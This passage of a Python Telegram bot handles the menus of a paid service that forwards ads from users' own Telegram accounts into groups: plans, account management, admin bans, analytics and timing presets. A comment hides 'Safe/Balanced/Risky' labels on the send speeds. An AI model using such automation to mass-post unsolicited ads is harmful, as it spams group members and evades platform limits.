                return
            
            # Grant premium with plan name
            plan_name = plan_id.replace('plan_', '').capitalize()
            set_user_premium(target_uid, plan['max_accounts'], plan_name)
            
            # Notify target user with plan-specific image
            try:
                notification_text = (
                    f"<b>🎉 Premium Activated!</b>\n\n"
                    f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                    f"<b>Your Plan:</b> {plan['emoji']} <b>{plan['name']}</b>\n"
                    f"<b>Max Accounts:</b> <code>{plan['max_accounts']}</code>\n"
                    f"<b>Duration:</b> <code>30 days</code>\n\n"
                    f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                    f"<i>Your premium plan has been activated by admin! Enjoy all features.</i>"
                )
                
                # Get plan-specific image from PLAN_IMAGES
                plan_image = PLAN_IMAGES.get(plan_name)
                if plan_image and plan_name in ['grow', 'prime', 'dominion']:
                    await main_bot.send_file(target_uid, plan_image, caption=notification_text, parse_mode='html')
                else:
                    await main_bot.send_message(target_uid, notification_text, parse_mode='html')
            except:
                pass
            
            # Confirm to admin
            del user_states[uid]
            await event.edit(
                f"**Premium Granted**\n\n"
                f"User: `{target_uid}`\n"
                f"Plan: {plan['name']}\n"
                f"Accounts: {plan['max_accounts']}\n\n"
                f"User has been notified."
            )
            return

        if data == "noop":
            await event.answer("Account limit reached!")
            return
        
        if data == "back_plans":
            # Return to plan selection screen with welcome/start image
            plan_msg = (
                "<b>💎 Choose Your Plan</b>\n\n"
                "<blockquote>Select a plan that fits your advertising needs.\n"
                "You can upgrade anytime.</blockquote>"
            )

            # Show welcome/start image when returning to plans
            welcome_image = MESSAGES.get('welcome_image', '')
            if welcome_image:
                await event.edit(file=welcome_image, text=plan_msg, parse_mode='html', buttons=plan_select_keyboard(uid))
            else:
                await event.edit(plan_msg, parse_mode='html', buttons=plan_select_keyboard(uid))
            return

        if data == "back_start":
            # If force-join is enabled and user isn't joined, show lock screen
            if not await enforce_forcejoin_or_prompt(event, edit=True):
                return

            # Check if user has accounts
            accounts = get_user_accounts(uid)
            
            if len(accounts) > 0:
                # User has accounts, show plan selection
                plan_msg = (
                    "**💎 Choose Your Plan to Continue:**\n\n"
                    "• Scout - Free starter plan\n"
                    "• Grow - Scale your campaigns (₹69)\n"
                    "• Prime - Advanced automation (₹199)\n"
                    "• Dominion - Enterprise level (₹389)"
                )
                
                welcome_image = MESSAGES.get('welcome_image', '')
                if welcome_image:
                    try:
                        await event.delete()
                    except:
                        pass
                    await main_bot.send_file(uid, welcome_image, caption=plan_msg, buttons=plan_select_keyboard(uid))
                else:
                    await event.edit(plan_msg, parse_mode='html', buttons=plan_select_keyboard(uid))
            else:
                # No accounts, show welcome screen
                await event.edit(render_welcome_text(), parse_mode='html', buttons=new_welcome_keyboard())
            return
        
        if data == "enter_dashboard":
            # Force-join gate (extra safety)
            if not await enforce_forcejoin_or_prompt(event, edit=True):
                return

            if not is_approved(uid):
                approve_user(uid)

            # Update account profiles when dashboard loads
            try:
                await apply_account_profile_templates(uid)
            except Exception:
                pass

            text = render_dashboard_text(uid)
            
            buttons = main_dashboard_keyboard(uid)
            # Admin button removed (already in main_dashboard_keyboard)
            
            await event.edit(text, parse_mode='html', buttons=buttons)
            return
        
        if data == "menu_account":
            # Clear any pending account adding state when returning to account menu
            if uid in user_states:
                del user_states[uid]
            
            accounts = get_user_accounts(uid)
            max_acc = get_user_max_accounts(uid)
            text = (
                f"<b>📱 Account Management</b>\n\n"
                f"<b>Accounts:</b> <code>{len(accounts)}/{max_acc}</code>\n\n"
                f"<i>Select an account below or add a new one.</i>"
            )
            await event.edit(text, parse_mode='html', buttons=account_list_keyboard(uid))
            return
        
        if data.startswith("accpage_"):
            page = int(data.split("_")[1])
            accounts = get_user_accounts(uid)
            max_acc = get_user_max_accounts(uid)
            text = (
                f"<b>👤 Account Management</b>\n\n"
                f"<b>Accounts:</b> <code>{len(accounts)}/{max_acc}</code>\n\n"
                f"<i>Page:</i> <code>{page+1}</code>"
            )
            await event.edit(text, parse_mode='html', buttons=account_list_keyboard(uid, page))
            return
        
        if data == "add_account":
            accounts = get_user_accounts(uid)
            max_accounts = get_user_max_accounts(uid)
            if len(accounts) >= max_accounts:
                await event.answer(f"Account limit reached ({max_accounts})!", alert=True)
                return
            user_states[uid] = {'action': 'phone'}
            await event.edit("**Add Account**\n\nSend phone number with country code:\n\nExample: `+919876543210`", buttons=[[Button.inline("Cancel", b"menu_account")]])
            return
        
        if data == "delete_account_menu":
            accounts = get_user_accounts(uid)
            if not accounts:
                await event.answer("No accounts to delete!", alert=True)
                return
            await event.edit("**Delete Account**\n\nSelect account to delete:", buttons=delete_account_list_keyboard(uid))
            return
        
        if data.startswith("confirm_del_"):
            acc_id = data.replace("confirm_del_", "")
            from bson.objectid import ObjectId
            try:
                acc = accounts_col.find_one({'_id': ObjectId(acc_id), 'user_id': uid})
            except:
                acc = accounts_col.find_one({'_id': acc_id, 'user_id': uid})
            if acc:
                phone = acc['phone']
                await event.edit(
                    f"**Confirm Delete**\n\nAre you sure you want to delete account:\n`{phone}`?",
                    buttons=[
                        [Button.inline("Yes, Delete", f"final_del_{acc_id}"), Button.inline("No, Cancel", b"delete_account_menu")]
                    ]
                )
            return
        
        if data.startswith("final_del_"):
            acc_id = data.replace("final_del_", "")
            from bson.objectid import ObjectId
            try:
                acc = accounts_col.find_one({'_id': ObjectId(acc_id), 'user_id': uid})
            except:
                acc = accounts_col.find_one({'_id': acc_id, 'user_id': uid})
            if acc:
                real_id = acc['_id']
                if real_id in forwarding_tasks:
                    forwarding_tasks[real_id].cancel()
                    del forwarding_tasks[real_id]
                accounts_col.delete_one({'_id': real_id})
                account_topics_col.delete_many({'account_id': real_id})
                account_settings_col.delete_many({'account_id': real_id})
                account_auto_groups_col.delete_many({'account_id': real_id})
                await event.answer("Account deleted!", alert=True)
            await event.edit(
                "<b>👤 Account Management</b>",
                parse_mode='html',
                buttons=account_list_keyboard(uid)
            )
            return
        
        if data == "menu_analytics":
            accounts = get_user_accounts(uid)
            total_sent = 0
            total_failed = 0
            total_groups = 0
            total_auto_replies = 0
            
            for acc in accounts:
                # Convert ObjectId to string for stats lookup
                account_id = str(acc['_id'])
                stats = account_stats_col.find_one({'account_id': account_id})
                if stats:
                    total_sent += stats.get('total_sent', 0)
                    total_failed += stats.get('total_failed', 0)
                    total_auto_replies += stats.get('auto_replies', 0)
                groups = account_auto_groups_col.count_documents({'account_id': account_id})
                total_groups += groups
            
            active = sum(1 for acc in accounts if acc.get('is_forwarding'))
            
            success_rate = 0.0
            if (total_sent + total_failed) > 0:
                success_rate = (total_sent / (total_sent + total_failed)) * 100

            text = (
                "<b>📊 Analytics</b>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                "<b>👥 Account Statistics:</b>\n"
                f"├ <b>Total Accounts:</b> <code>{len(accounts)}</code>\n"
                f"├ <b>Active Accounts:</b> <code>{active}</code>\n"
                f"└ <b>Total Groups:</b> <code>{total_groups}</code>\n\n"
                "<b>📈 Message Statistics:</b>\n"
                f"├ <b>✅ Messages Sent:</b> <code>{total_sent}</code>\n"
                f"├ <b>❌ Messages Failed:</b> <code>{total_failed}</code>\n"
                f"├ <b>📊 Success Rate:</b> <code>{success_rate:.1f}%</code>\n"
                f"└ <b>💬 Auto Replies:</b> <code>{total_auto_replies}</code>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
            )

            await event.edit(text, parse_mode='html', buttons=[[Button.inline("← Back", b"enter_dashboard")]])
            return
        
        if data == "admin_banned_users" or data.startswith("banned_page_"):
            if not is_admin(uid):
                return
            
            # Pagination for banned users
            page = 0
            if data.startswith("banned_page_"):
                page = int(data.split("_")[2])
            
            per_page = 5
            skip = page * per_page
            
            # Get banned users
            banned_users = list(users_col.find({'banned': True}).skip(skip).limit(per_page))
            total_banned = users_col.count_documents({'banned': True})
            
            if total_banned == 0:
                await event.edit(
                    "<b>🚫 Banned Users</b>\n\n"
                    "<i>No banned users found.</i>",
                    parse_mode='html',
                    buttons=[[Button.inline("← Back", b"admin_panel")]]
                )
                return
            
            pages = (total_banned + per_page - 1) // per_page
            
            text = (
                f"<b>🚫 Banned Users</b>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                f"<b>Total Banned:</b> <code>{total_banned}</code>\n"
                f"<b>Current Page:</b> <code>{page + 1}/{pages}</code>\n\n"
                "<b>💡 How to Ban a User:</b>\n"
                "<code>/ban [user_id] [reason]</code>\n\n"
                "<b>📌 Example:</b>\n"
                "<code>/ban 123456789 spam</code>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
            )
            
            buttons = []
            for user in banned_users:
                user_id = user['user_id']
                reason = user.get('ban_reason', 'No reason')[:20]
                buttons.append([Button.inline(f"🚫 User {user_id} - {reason}", f"banned_user_{user_id}")])
            
            # Pagination
            nav = []
            if page > 0:
                nav.append(Button.inline("⬅️ Prev", f"banned_page_{page-1}"))
            if page < pages - 1:
                nav.append(Button.inline("➡️ Next", f"banned_page_{page+1}"))
            if nav:
                buttons.append(nav)
            
            buttons.append([Button.inline("← Back", b"admin_panel")])
            
            await event.edit(text, parse_mode='html', buttons=buttons)
            return
        
        if data.startswith("banned_user_"):
            if not is_admin(uid):
                return
            
            target_id = int(data.split("_")[2])
            user = users_col.find_one({'user_id': target_id})
            
            if not user or not user.get('banned'):
                await event.answer("User not found or not banned!", alert=True)
                return
            
            reason = user.get('ban_reason', 'No reason provided')
            banned_at = user.get('banned_at')
            banned_date = banned_at.strftime('%d %b %Y %H:%M') if banned_at else 'Unknown'
            
            text = (
                "<b>🚫 Banned User Details</b>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                f"<b>User ID:</b> <code>{target_id}</code>\n"
                f"<b>Ban Reason:</b> <code>{reason}</code>\n"
                f"<b>Banned On:</b> <code>{banned_date}</code>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
            )
            
            buttons = [
                [Button.inline("✅ Unban User", f"unban_{target_id}")],
                [Button.inline("← Back", b"admin_banned_users")]
            ]
            
            await event.edit(text, parse_mode='html', buttons=buttons)
            return
        
        if data.startswith("unban_"):
            if not is_admin(uid):
                return
            
            target_id = int(data.split("_")[1])
            
            # Unban the user
            users_col.update_one(
                {'user_id': target_id},
                {'$set': {
                    'banned': False,
                    'unbanned_at': datetime.now(),
                    'unbanned_by': uid
                }}
            )
            
            # Notify the user
            try:
                await main_bot.send_message(
                    target_id,
                    "<b>✅ You Have Been Unbanned!</b>\n\n"
                    "<i>You can now use the bot again. Welcome back!</i>",
                    parse_mode='html'
                )
            except Exception:
                pass
            
            await event.answer("User has been unbanned!", alert=True)
            
            # Return to banned users list
            await event.edit(
                "<b>🚫 Banned Users</b>\n\n"
                "<i>User has been unbanned successfully!</i>",
                parse_mode='html',
                buttons=[[Button.inline("← Back to List", b"admin_banned_users")], [Button.inline("← Admin Panel", b"admin_panel")]]
            )
            return
        
        if data.startswith("admin_reset_user_"):
            if not is_admin(uid):
                return
            
            target_id = int(data.split("_")[3])
            
            # Get all user's accounts
            accounts = get_user_accounts(target_id)
            accounts_deleted = 0
            tasks_stopped = 0
            
            # Stop all running tasks and delete accounts
            for acc in accounts:
                account_id = str(acc['_id'])
                
                # Stop forwarding task if running
                if account_id in forwarding_tasks:
                    try:
                        forwarding_tasks[account_id].cancel()
                        del forwarding_tasks[account_id]
                        tasks_stopped += 1
                    except Exception:
                        pass
                
                # Stop auto reply if running
                if account_id in auto_reply_clients:
                    try:
                        await auto_reply_clients[account_id].disconnect()
                        del auto_reply_clients[account_id]
                    except Exception:
                        pass
                
                # Delete account data
                accounts_col.delete_one({'_id': acc['_id']})
                account_topics_col.delete_many({'account_id': account_id})
                account_auto_groups_col.delete_many({'account_id': account_id})
                account_failed_groups_col.delete_many({'account_id': account_id})
                account_stats_col.delete_one({'account_id': account_id})
                accounts_deleted += 1
            
            # Reset user to free plan
            users_col.update_one(
                {'user_id': target_id},
                {'$set': {
                    'tier': 'free',
                    'plan': 'scout',
                    'plan_name': 'Scout',
                    'max_accounts': 1,
                    'premium_expires_at': None,
                    'plan_expiry': None,
                    'approved': True
                }}
            )
            
            # Notify the user
            try:
                await main_bot.send_message(
                    target_id,
                    "<b>🔄 Account Reset</b>\n\n"
                    "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                    f"<b>Accounts Deleted:</b> <code>{accounts_deleted}</code>\n"
                    f"<b>Tasks Stopped:</b> <code>{tasks_stopped}</code>\n\n"
                    "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                    "<i>Your account has been reset by admin. All data cleared and plan reset to Scout (Free).</i>",
                    parse_mode='html'
                )
            except Exception:
                pass
            
            await event.answer(f"User {target_id} has been reset!", alert=True)
            
            # Show confirmation
            await event.edit(
                "<b>✅ User Reset Complete</b>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                f"<b>User ID:</b> <code>{target_id}</code>\n"
                f"<b>Accounts Deleted:</b> <code>{accounts_deleted}</code>\n"
                f"<b>Tasks Stopped:</b> <code>{tasks_stopped}</code>\n"
                f"<b>Plan Reset:</b> <code>Scout (Free)</code>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>",
                parse_mode='html',
                buttons=[[Button.inline("← Back to Users", b"admin_all_users")], [Button.inline("← Admin Panel", b"admin_panel")]]
            )
            return
        
        if data == "my_profile":
            user = get_user(uid)
            
            # Check if user is admin for special display
            if is_admin(uid):
                # Admin/God Mode Display
                accounts = get_user_accounts(uid)
                active_accounts = sum(1 for acc in accounts if acc.get('is_forwarding'))
                total_groups = 0
                total_messages = 0
                
                for acc in accounts:
                    account_id = str(acc['_id'])
                    groups = account_auto_groups_col.count_documents({'account_id': account_id})
                    total_groups += groups
                    
                    stats = account_stats_col.find_one({'account_id': account_id})
                    if stats:
                        total_messages += stats.get('total_sent', 0)
                
                # Get current settings
                interval_preset = user.get('interval_preset', 'medium')
                if interval_preset == 'custom':
                    custom = user.get('custom_interval', {})
                    interval_str = f"Custom ({custom.get('msg_delay', 30)}s / {custom.get('round_delay', 600)}s)"
                else:
                    preset_info = INTERVAL_PRESETS.get(interval_preset, INTERVAL_PRESETS['medium'])
                    # Show only preset name (Slow/Medium/Fast) without Safe/Balanced/Risky
                    preset_name = interval_preset.capitalize()
                    interval_str = f"{preset_name} ({preset_info['msg_delay']}s / {preset_info['round_delay']}s)"
                
                # Get actual feature status from user settings (not hardcoded for admins)
                auto_reply = "✅ Enabled" if user.get('autoreply_enabled') else "❌ Disabled"
                smart_rotation = "✅ Enabled" if user.get('smart_rotation') else "❌ Disabled"
                # Logs are enabled if logs_chat_id is set
                logs = "✅ Enabled" if user.get('logs_chat_id') else "❌ Disabled"
                
                try:
                    username = f"@{event.sender.username}" if event.sender.username else "Not set"
                except:
                    username = "Not set"
                
                text = (
                    f"<b>👤 My Profile</b>\n\n"
                    f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                    f"<b>📱 User Details:</b>\n"
                    f"├ <b>User ID:</b> <code>{uid}</code>\n"
                    f"├ <b>Username:</b> <code>{username}</code>\n"
                    f"└ <b>Plan:</b> ⚡ <b>God Mode</b>\n\n"
                    f"<b>💎 Subscription:</b>\n"
                    f"├ <b>Expires On:</b> <code>∞ Never</code>\n"
                    f"└ <b>Days Left:</b> <code>∞ Unlimited</code>\n\n"
                    f"<b>📊 Usage Statistics:</b>\n"
                    f"├ <b>Total Accounts:</b> <code>{len(accounts)}/999</code>\n"
                    f"├ <b>Active Accounts:</b> <code>{active_accounts}</code>\n"
                    f"├ <b>Total Groups:</b> <code>{total_groups}</code>\n"
                    f"└ <b>Total Messages Sent:</b> <code>{total_messages}</code>\n\n"
                    f"<b>⚙️ Current Settings:</b>\n"
                    f"├ <b>Interval:</b> <code>{interval_str}</code>\n"
                    f"├ <b>Auto Reply:</b> {auto_reply}\n"
                    f"├ <b>Smart Rotation:</b> {smart_rotation}\n"
                    f"└ <b>Logs:</b> {logs}\n\n"
                    f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
                )
                # Note: Admin profile does not show auto sleep (God Mode)
            else:
                # Regular User Display
                # Check if user still has active premium
                user_is_premium = is_premium(uid)
                
                if user_is_premium:
                    # User has active premium - show their plan
                    plan_key = user.get('plan', 'scout')
                    plan = PLANS.get(plan_key, PLAN_SCOUT)
                else:
                    # Premium expired or revoked - reset to Scout
                    plan_key = 'scout'
                    plan = PLAN_SCOUT
                
                # Calculate expiry and days remaining
                expiry_date = user.get('plan_expiry')
                if expiry_date and user_is_premium:
                    days_remaining = (expiry_date - datetime.now()).days
                    expiry_str = expiry_date.strftime('%d %b %Y')
                    days_str = f"{days_remaining} days" if days_remaining > 0 else "Expired"
                else:
                    expiry_str = "Never (Free Plan)"
                    days_str = "∞ Unlimited"
                
                # Get usage statistics
                accounts = get_user_accounts(uid)
                active_accounts = sum(1 for acc in accounts if acc.get('is_forwarding'))
                total_groups = 0
                total_messages = 0
                
                for acc in accounts:
                    account_id = str(acc['_id'])
                    groups = account_auto_groups_col.count_documents({'account_id': account_id})
                    total_groups += groups
                    
                    # Get total messages sent
                    stats = account_stats_col.find_one({'account_id': account_id})
                    if stats:
                        total_messages += stats.get('total_sent', 0)
                
                # Get current settings
                interval_preset = user.get('interval_preset', 'medium')
                if interval_preset == 'custom':
                    custom = user.get('custom_interval', {})
                    interval_str = f"Custom ({custom.get('msg_delay', 30)}s / {custom.get('round_delay', 600)}s)"
                else:
                    preset_info = INTERVAL_PRESETS.get(interval_preset, INTERVAL_PRESETS['medium'])
                    # Show only preset name (Slow/Medium/Fast) without Safe/Balanced/Risky
                    preset_name = interval_preset.capitalize()
                    interval_str = f"{preset_name} ({preset_info['msg_delay']}s / {preset_info['round_delay']}s)"
                
                # Fix: Check actual user settings, not just premium status
                auto_reply = "✅ Enabled" if user.get('autoreply_enabled') else "❌ Disabled"
                smart_rotation = "✅ Enabled" if user.get('smart_rotation') else "❌ Disabled"
                # Logs are enabled if logs_chat_id is set
                logs = "✅ Enabled" if user.get('logs_chat_id') else "❌ Disabled"
                
                # Auto Sleep status for profile
                profile_sleep_enabled = user.get('auto_sleep_enabled', False)
                profile_sleep_duration = user.get('auto_sleep_duration', 1800)
                if profile_sleep_duration == 1800:
                    profile_sleep_dur_text = "30 min"
                elif profile_sleep_duration == 3600:
                    profile_sleep_dur_text = "1 hr"
                elif profile_sleep_duration == 18000:
                    profile_sleep_dur_text = "5 hrs"
                elif profile_sleep_duration == 28800:
                    profile_sleep_dur_text = "8 hrs"
                else:
                    profile_sleep_dur_text = f"{profile_sleep_duration // 60} min"
                auto_sleep_display = "✅ ON (2AM–6AM)" if profile_sleep_enabled else "❌ OFF"
                
                # Get username
                try:
                    username = f"@{event.sender.username}" if event.sender.username else "Not set"
                except:
                    username = "Not set"
                
                text = (
                    f"<b>👤 My Profile</b>\n\n"
                    f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                    f"<b>📱 User Details:</b>\n"
                    f"├ <b>User ID:</b> <code>{uid}</code>\n"
                    f"├ <b>Username:</b> <code>{username}</code>\n"
                    f"└ <b>Plan:</b> {plan['emoji']} <b>{plan['name']}</b>\n\n"
                    f"<b>💎 Subscription:</b>\n"
                    f"├ <b>Expires On:</b> <code>{expiry_str}</code>\n"
                    f"└ <b>Days Left:</b> <code>{days_str}</code>\n\n"
                    f"<b>📊 Usage Statistics:</b>\n"
                    f"├ <b>Total Accounts:</b> <code>{len(accounts)}/{plan['max_accounts']}</code>\n"
                    f"├ <b>Active Accounts:</b> <code>{active_accounts}</code>\n"
                    f"├ <b>Total Groups:</b> <code>{total_groups}</code>\n"
                    f"└ <b>Total Messages Sent:</b> <code>{total_messages}</code>\n\n"
                    f"<b>⚙️ Current Settings:</b>\n"
                    f"├ <b>Interval:</b> <code>{interval_str}</code>\n"
                    f"├ <b>Auto Reply:</b> {auto_reply}\n"
                    f"├ <b>Smart Rotation:</b> {smart_rotation}\n"
                    f"├ <b>Logs:</b> {logs}\n"
                    f"└ <b>💤 Auto Sleep:</b> {auto_sleep_display}\n\n"
                    f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
                )
            
            await event.edit(text, parse_mode='html', buttons=[[Button.inline("← Back to Dashboard", b"enter_dashboard")]])
            return
        
        if data == "menu_interval":
            user = get_user(uid)
            current = user.get('interval_preset', 'medium')
            
            if current == 'custom' and user.get('custom_interval'):
                custom = user['custom_interval']
                text = (
                    "<b>⏱️ Interval Settings</b>\n\n"
                    "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                    "<b>📋 Current Configuration:</b>\n"
                    "├ <b>Mode:</b> <code>Custom</code>\n"
                    f"├ <b>⏰ Message Delay:</b> <code>{custom['msg_delay']}s</code>\n"
                    f"└ <b>🔄 Round Delay:</b> <code>{custom['round_delay']}s</code>\n\n"
                    "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
                )
            else:
                preset = INTERVAL_PRESETS.get(current, INTERVAL_PRESETS['medium'])
                preset_name = current.capitalize()
                text = (
                    "<b>⏱️ Interval Settings</b>\n\n"
                    "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                    "<b>📋 Current Configuration:</b>\n"
                    f"├ <b>Mode:</b> <code>{preset_name}</code>\n"
                    f"├ <b>⏰ Message Delay:</b> <code>{preset['msg_delay']}s</code>\n"
                    f"└ <b>🔄 Round Delay:</b> <code>{preset['round_delay']}s</code>\n\n"
                    "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
                )
            
            await event.edit(text, parse_mode='html', buttons=interval_menu_keyboard(uid))
            return
        
        if data.startswith("interval_") and data not in ("interval_locked", "interval_custom"):
            # Handle preset intervals (slow, medium, fast) - available to all plans
            preset_key = data.replace("interval_", "")
            if preset_key in INTERVAL_PRESETS:
                users_col.update_one({'user_id': uid}, {'$set': {'interval_preset': preset_key}})
                preset = INTERVAL_PRESETS[preset_key]
                preset_name = preset_key.capitalize()
                await event.answer(f"Interval set to: {preset_name}", alert=True)

                text = (
                    "<b>⏱️ Interval Settings</b>\n\n"
                    "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
                    "<b>📋 Current Configuration:</b>\n"
                    f"├ <b>Mode:</b> <code>{preset_name}</code>\n"
                    f"├ <b>⏰ Message Delay:</b> <code>{preset['msg_delay']}s</code>\n"
                    f"└ <b>🔄 Round Delay:</b> <code>{preset['round_delay']}s</code>\n\n"
                    "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
                )
                await event.edit(text, parse_mode='html', buttons=interval_menu_keyboard(uid))
            return
        
        if data == "interval_locked":
            # Free plan users trying to access custom intervals
            text = (
                "<b>🔒 Premium Feature</b>\n\n"
                "<blockquote>Custom intervals are available for Premium plans only.\n\n"
                "Upgrade to Grow, Prime, or Dominion to unlock custom interval settings.</blockquote>\n\n"
                "<b>Purchase Premium to unlock this feature.</b>"
            )
            await event.edit(text, parse_mode='html', buttons=[
                [Button.inline("💎 View Plans", b"back_plans")],
                [Button.inline("← Back", b"menu_interval")]
            ])
            return
        
        if data == "interval_custom":
            if not is_premium(uid):
                await event.answer("Premium only!", alert=True)
                return
            user_states[uid] = {'action': 'custom_interval', 'step': 'msg_delay'}
            await event.edit(
                "⏱️ Custom Interval\n\nEnter message delay in seconds (1-9999):",
                buttons=[[Button.inline("← Back", b"menu_interval")]]
            )
            return
        
        if data == "menu_topics":
            accounts = get_user_accounts(uid)
            if not accounts:
                await event.answer("Add an account first!", alert=True)
                return
            
            tier_settings = get_user_tier_settings(uid)
            max_topics = tier_settings.get('max_topics', 3)
            
            text = (
                "<b>🏷️ Topics</b>\n\n"
                "<blockquote>Select a topic to add group links.</blockquote>\n\n"
                f"<b>Available topics:</b> <code>{max_topics}/{len(TOPICS)}</code>"
            )
            if not is_premium(uid):
                text += "\n\n<i>Upgrade to Premium for all topics.</i>"
            
            buttons = []
            for i, topic in enumerate(TOPICS[:max_topics]):
                count = 0
                for acc in accounts:
                    count += account_topics_col.count_documents({'account_id': acc['_id'], 'topic': topic})
                buttons.append([Button.inline(f"{topic.title()} ({count} groups)", f"topic_select_{topic}")])
            
            if not is_premium(uid) and len(TOPICS) > max_topics:
                buttons.append([Button.inline("Unlock More Topics", b"go_premium")])
            
            buttons.append([Button.inline("Back", b"enter_dashboard")])
            await event.edit(text, parse_mode='html', buttons=buttons)
            return
        
        if data.startswith("topic_select_"):
            topic = data.replace("topic_select_", "")
            accounts = get_user_accounts(uid)
            
            tier_settings = get_user_tier_settings(uid)
            max_groups = tier_settings.get('max_groups_per_topic', 10)
            
            if len(accounts) == 1:
                acc = accounts[0]
                groups = list(account_topics_col.find({'account_id': acc['_id'], 'topic': topic}))
                
                text = (
                    f"<b>{_h(topic.title())}</b>\n\n"
                    f"<b>Groups:</b> <code>{len(groups)}/{max_groups}</code>\n\n"
                    "<b>Send topic link to add:</b>\n"
                    "<code>https://t.me/groupname/5</code>"
                )
                buttons = [[Button.inline("View Groups", f"view_topic_groups_{topic}_{acc['_id']}")]] if groups else []
                buttons.append([Button.inline("Back", b"menu_topics")])
                msg = await event.edit(text, parse_mode='html', buttons=buttons)
                user_states[uid] = {'action': 'add_topic_link', 'topic': topic, 'account_id': acc['_id'], 'last_msg_id': msg.id if hasattr(msg, 'id') else event.message_id}
            else:
                text = f"<b>{_h(topic.title())}</b>\n\n<i>Select account to add groups:</i>"
                buttons = []
                for acc in accounts:
                    phone = acc['phone'][-4:]
                    name = acc.get('name', 'Unknown')[:12]
                    count = account_topics_col.count_documents({'account_id': acc['_id'], 'topic': topic})
                    buttons.append([Button.inline(f"{phone} - {name} ({count})", f"topic_acc_{topic}_{acc['_id']}")])
                buttons.append([Button.inline("Back", b"menu_topics")])
                await event.edit(text, parse_mode='html', buttons=buttons)
            return
        
        if data.startswith("topic_acc_"):
            parts = data.replace("topic_acc_", "").split("_", 1)
            topic = parts[0]
            acc_id = parts[1] if len(parts) > 1 else ""
            
            tier_settings = get_user_tier_settings(uid)
            max_groups = tier_settings.get('max_groups_per_topic', 10)
            groups = list(account_topics_col.find({'account_id': acc_id, 'topic': topic}))
            
            text = (
                f"<b>🏷️ {topic.title()}</b>\n\n"
                f"<b>Groups:</b> <code>{len(groups)}/{max_groups}</code>\n\n"
                "<i>Send a topic link to add.</i>\n"
                "<code>Example: https://t.me/groupname/5</code>"
            )
            buttons = [[Button.inline("👁️ View Groups", f"view_topic_groups_{topic}_{acc_id}")]] if groups else []
            buttons.append([Button.inline("← Back", f"topic_select_{topic}")])
            msg = await event.edit(text, parse_mode='html', buttons=buttons)
            user_states[uid] = {'action': 'add_topic_link', 'topic': topic, 'account_id': acc_id, 'last_msg_id': msg.id if hasattr(msg, 'id') else event.message_id}
            return
        
        if data.startswith("view_topic_groups_"):
            parts = data.replace("view_topic_groups_", "").split("_", 1)
            topic = parts[0]
            acc_id = parts[1] if len(parts) > 1 else ""
            
            groups = list(account_topics_col.find({'account_id': acc_id, 'topic': topic}))
            total = len(groups)
            display_limit = 5
            
            text = f"<b>🏷️ {topic.title()} Groups</b> <code>({total} total)</code>\n\n"
            for i, g in enumerate(groups[:display_limit]):
                title = g.get('title', g.get('url', 'Unknown'))[:25]
                text += f"{i+1}. {title}\n"
            
            if total > display_limit:
                text += f"\n...and {total - display_limit} more groups"
            
            buttons = [
                [Button.inline("Clear All", f"clear_topic_{topic}_{acc_id}")],
                [Button.inline("Back", f"topic_select_{topic}")]
            ]
            await event.edit(text, parse_mode='html', buttons=buttons)
            return
        
        if data.startswith("clear_topic_"):
            parts = data.replace("clear_topic_", "").split("_", 1)
            topic = parts[0]
            acc_id = parts[1] if len(parts) > 1 else ""
            
            account_topics_col.delete_many({'account_id': acc_id, 'topic': topic})
            await event.answer(f"Cleared all {topic} groups!", alert=True)
            await event.edit(
                f"<b>🏷️ {topic.title()}</b>\n\n<b>Groups:</b> <code>0</code>\n\n<i>Send a group link to add.</i>",
                parse_mode='html',
                buttons=[[Button.inline("← Back", b"menu_topics")]]
            )
            return
        
        # Locked premium-only buttons in Settings menu
        if data in {"locked_smart_rotation", "locked_auto_group_join", "locked_autoreply", "locked_topics"}:
            await event.edit(
                "<b>🔒 Premium Feature</b>\n\n<blockquote>Purchase Premium to unlock this feature.</blockquote>",
                parse_mode='html',
                buttons=[[Button.inline("💎 View Plans", b"back_plans")], [Button.inline("← Back", b"menu_settings")]]
            )
            return
        
        # Locked forwarding mode options (Topics Only and Both)
        if data == "locked_fwd_mode":
            await event.edit(
                "<b>🔒 Premium Feature</b>\n\n<blockquote>Purchase Premium to unlock this forwarding mode.</blockquote>",
                parse_mode='html',
                buttons=[[Button.inline("💎 View Plans", b"back_plans")], [Button.inline("← Back", b"menu_fwd_mode")]]
            )
            return

        if data == "menu_settings":
            user_doc = get_user(uid)
            tier_settings = get_user_tier_settings(uid)
            
            # Get current settings
            ads_mode = user_doc.get('ads_mode', 'saved').upper()
            
            # Auto-reply status (check if user has explicitly enabled it AND set a message)
            auto_reply_feature_available = tier_settings.get('auto_reply_enabled', False)
            if auto_reply_feature_available:
                user = get_user(uid)
                enabled_by_user = user.get('autoreply_enabled', False)  # Change default to False
                
                # Also check if user has actually set an auto-reply message
                user_accounts = get_user_accounts(uid)
                has_auto_reply_message = False
                if user_accounts:
                    for acc in user_accounts:
                        settings = get_account_settings(str(acc.get('_id')))
                        if settings.get('auto_reply'):
                            has_auto_reply_message = True
                            break
                
                # Show ON only if enabled AND has message
